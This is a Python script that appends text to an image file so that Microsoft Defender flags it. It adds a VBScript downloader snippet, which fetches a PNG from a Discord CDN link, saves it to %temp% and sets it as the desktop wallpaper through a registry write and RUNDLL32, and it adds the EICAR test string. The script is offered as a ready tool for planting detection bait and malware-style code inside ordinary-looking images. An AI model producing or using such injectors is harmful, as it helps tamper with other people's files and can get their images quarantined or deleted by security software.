#!/usr/bin/python3
import argparse

def main():
    parser = argparse.ArgumentParser(description="Inject Microsoft Defender triggerer to an image")
    parser.add_argument("input", help="An image input to inject the Microsoft Defender triggerer")
    parser.add_argument("output", help="An image output for resulting image")
    args = parser.parse_args()

    file = open(args.input)
    file_new = open(args.output, 'w')
    for x in file.readlines():
    	file_new.write(x)
    file_new.write("""Set objShell = CreateObject("WScript.Shell")
Set objEnv = objShell.Environment("User")
strDirectory = objShell.ExpandEnvironmentStrings("%temp%")
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://cdn.discordapp.com/emojis/681577625394872370.png?v=1", False
xHttp.Send
with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile strDirectory + "\myImage.png", 2 '//overwrite
end with
objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", strDirectory + "\myImage.png"
objShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
""")
    file_new.write('X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')
    file.close()
    file_new.close()

if __name__ == "__main__":
    main()
